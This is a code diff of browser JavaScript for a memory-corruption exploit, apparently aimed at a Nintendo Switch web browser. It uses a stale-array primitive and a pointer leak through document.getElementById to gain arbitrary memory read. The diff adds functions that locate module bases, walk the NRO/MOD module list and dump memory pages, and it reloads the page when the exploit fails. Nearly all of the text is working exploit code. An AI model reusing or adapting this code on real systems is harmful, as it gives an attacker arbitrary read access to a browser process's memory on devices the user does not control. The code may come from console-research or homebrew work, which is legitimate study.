@@ -25,7 +25,7 @@ if(onSwitch !== undefined) {
 	};
 }
 
-var readsize = 1024*1024, readoff = 1024 * 1024 * 9 + 0;
+var readsize = 495616, readoff = 1024 * 1024 * 7;
 function memdump(lo, hi, temp, size) {
 	var data = new Array(size);
 	for(var i = 0; i < size; ++i)
@@ -71,71 +71,220 @@ function doExploit(buf, stale, temp) {
 		dump('Tem', temp, count);
 	}
 
-	function setStale(obj) {
-		eval('(function(obj) { stale[eval("1 || ' + Math.random() + '")] = obj; log(stale[1].toString()[0]); })')(obj);
-	}
-
-	function setPtr(lo, hi, len) {
-		setStale(temp);
+	function getBase() {
+		stale[1] = document.getElementById;
+		var lo = buf[6];
+		var hi = buf[7];
+		stale[1] = temp;
 		buf[4] = lo;
 		buf[5] = hi;
-		buf[6] = len;
+		buf[6] = 128;
+
+		lo = temp[6];
+		hi = temp[7];
+		buf[4] = lo;
+		buf[5] = hi;
+		var lo = (((temp[4] - 0x835e5c) >>> 0) & 0xFFFFFFFF) >>> 0;
+		if(temp[4] < 0x835e5c)
+			hi = (temp[5] - 1) >>> 0;
+		else
+			hi = temp[5] >>> 0;
+
+		return [lo, hi];
 	}
 
-	function read4(lo, hi) {
-		setPtr(lo, hi, 1);
-		return stale[1][0];
+	function dumpNRO() {
+		var addr = getBase();
+		var lo = addr[0], hi = addr[1];
+		log('Reading from 0x' + hi.toString(16) + ' : 0x' + lo.toString(16));
+
+		buf[4] = (lo + readoff) >>> 0;
+		buf[5] = hi;
+		buf[6] = 0xFFFFFFFF;
+
+		memdump(lo, hi, temp, readsize >> 2);
 	}
 
-	function readAddr(obj) {
-		setStale(obj);
-		log('Obj memory:');
-		dumpbuf(16);
-		var addr = [buf[14], buf[15]];
-		setStale(temp);
-		log('Prev 0x' + addr[0].toString(16));
-		log('Now 0x' + buf[4].toString(16));
+	function findExtents(addrOffset, direction) {
+		var addr = getBase();
+		var lo = addr[0], hi = addr[1];
+		
+		lo = ((lo + addrOffset) >>> 0);
 
-		return addr;
+		buf[4] = lo;
+		buf[5] = hi;
+		lo = temp[0];
+		hi = temp[1];
+
+		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;
+
+		lo = (lo - (87 * 4096) + 0x57B00) >>> 0;
+
+		buf[4] = lo;
+		buf[5] = hi;
+		lo = temp[0];
+		hi = temp[1];
+
+		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;
+
+		lo = (lo - (109 * 4096) + 0x6D860) >>> 0;
+
+		buf[4] = lo;
+		buf[5] = hi;
+		lo = temp[0];
+		hi = temp[1];
+
+		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;
+
+		lo = (lo - (1890 * 4096) + readoff) >>> 0;
+
+		buf[4] = lo;
+		buf[5] = hi;
+		buf[6] = 0xFFFFFFFF;
+		memdump(lo, hi, temp, readsize >> 2);
+		return;
+
+		var numpages = 0;
+
+		while(true) {
+			buf[4] = lo;
+			buf[5] = hi;
+
+			log('Page ' + (direction == -1 ? '-' : '+') + numpages + ' (0x' + lo.toString(16) + '): ' + temp[0]);
+			for(var i = 0; i < 10; ++i)
+				log('~~buffer~~');
+
+			numpages++;
+			if(direction == -1) {
+				var t = lo;
+				lo = (((lo - 0x1000) >>> 0) & 0xFFFFFFFF) >>> 0;
+				if(lo > t)
+					hi -= 1;
+			} else {
+				var t = lo;
+				lo = (((lo + 0x1000) >>> 0) & 0xFFFFFFFF) >>> 0;
+				if(lo < t)
+					hi += 1;
+			}
+		}
 	}
 
-	/*log('Temp memory:')
-	dumpbuf(16);
-	var addr = readAddr(tu);
-	log('Temp memory:')
-	dumpbuf(16);
-	log(read4(addr[0], addr[1]).toString(16));*/
+	function walkList() {
+		var addr = getBase();
+		var lo = addr[0], hi = addr[1];
+		log('Initial NRO at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
 
-	stale[1] = document.getElementById;
-	dumpbuf(12);
-	var lo = buf[6];
-	var hi = buf[7];
-	stale[1] = temp;
-	buf[4] = lo;
-	buf[5] = hi;
-	buf[6] = 128;
-	log('????????');
+		while(true) {
+			var blo = lo;
+			var bhi = hi;
 
-	lo = temp[6];
-	hi = temp[7];
-	buf[4] = lo;
-	buf[5] = hi;
-	dumptemp(16);
-	log('!!!!!!!!!!!!');
-	var lo = (((temp[4] - 0x835e5c + readoff) >>> 0) & 0xFFFFFFFF) >>> 0;
-	if(temp[4] < 0x835e5c)
-		hi = (temp[5] - 1) >>> 0;
-	else
-		hi = temp[5] >>> 0;
+			buf[4] = blo;
+			buf[5] = bhi;
+			buf[6] = 0xFFFFFFFF;
+			var modoff = temp[1];
+			lo = (blo + modoff) >>> 0;
+			buf[4] = lo;
+			var modstr = temp[0x18 >> 2];
+			lo = (lo + modstr) >>> 0;
+			buf[4] = lo;
 
-	log('Reading from 0x' + hi.toString(16) + ' : 0x' + lo.toString(16));
+			// Read next link ptr
+			lo = temp[0];
+			hi = temp[1];
+			if(lo == 0 && hi == 0) {
+				log('Reached end');
+				break;
+			}
 
-	buf[4] = lo;
-	buf[5] = hi;
+			buf[4] = lo;
+			buf[5] = hi;
+
+			var nrolo = temp[8], nrohi = temp[9];
+
+			if(nrolo == 0 && nrohi == 0) {
+				log('Hit RTLD at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
+				lo = temp[4];
+				hi = temp[5];
+				break;
+			}
+			buf[4] = nrolo;
+			buf[5] = nrohi;
+
+			if(temp[4] != 0x304f524e) {
+				log('Something is wrong.  No NRO header at base.');
+				//memdump(nrolo, nrohi, temp, (4096 * 3) >> 2);
+				break;
+			}
+
+			lo = nrolo;
+			hi = nrohi;
+			log('Found NRO at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
+		}
+
+		var ctr = 0;
+
+		while(true) {
+			//log('xxx ptr lo: ' + lo.toString(16));
+			//log('xxx ptr hi: ' + hi.toString(16));
+			buf[4] = lo;
+			buf[5] = hi;
+
+			nrolo = temp[8];
+			nrohi = temp[9];
+			//log('nro base lo: ' + nrolo.toString(16));
+			//log('nro base hi: ' + nrohi.toString(16));
+			if(nrolo == 0 && nrohi == 0) {
+				log('Hm, hit the end of things.  Back in rtld?');
+				return;
+			}
+
+			buf[4] = nrolo;
+			buf[5] = nrohi;
+			
+			if(temp[temp[1] >> 2] == 0x30444f4d) {
+				log('Got MOD at 0x' + nrohi.toString(16) + ':0x' + nrolo.toString(16));
+				if(++ctr == 2)
+					while(true) {
+						log('Attempting write of page...');
+						memdump(nrolo, nrohi, temp, 4096 >> 2);
+						nrolo = (nrolo + 4096) >>> 0;
+						buf[4] = nrolo;
+					}
+			} else {
+				log('No valid MOD header.  Back at RTLD.');
+				break;
+			}
+
+			buf[4] = lo;
+			buf[5] = hi;
+			lo = temp[0];
+			hi = temp[1];
+			//log('new ptr lo: ' + lo.toString(16));
+			//log('new ptr hi: ' + hi.toString(16));
+			if(lo == 0 && hi == 0) {
+				log('End of chain.');
+				break;
+			}
+		}
+	}
+
+	walkList();
+
+	/*buf[4] = lo = 0x492cb000 >>> 0;
+	buf[5] = hi = 0x60;
 	buf[6] = 0xFFFFFFFF;
 
-	memdump(lo, hi, temp, readsize >> 2);
-	
+	if(temp[4] != 0x304f524e) {
+		log('Something is wrong.  No NRO header at base.');
+		return;
+	}
+
+	var size = temp[0x18 >> 2] + temp[0x38 >> 2];
+	lo = (lo + 1024 * 1024) >>> 0;
+	buf[4] = lo;
+	log('Total size of new module: 0x' + size.toString(16));
+	memdump(lo, hi, temp, (size - 1024 * 1024) >> 2);*/
+
 	/*var ctr = 0;
 	for(var i = 0; i < 901; ++i) {
 		buf[4] = lo;
@@ -221,11 +370,18 @@ function doItAll() {
 
 	log('Looking for buf...');
 
+	var found = false;
 	for(var i = 0; i < bufs.length; ++i) {
 		if(bufs[i][0] != 0x41424344) {
+			found = true;
 			doExploit(bufs[i], stale, temp);
 			break;
 		}
+	}
+
+	if(!found) {
+		log('Failed to find buffer.  Reloading.');
+		location.reload();
 	}
 
 	log('Done');
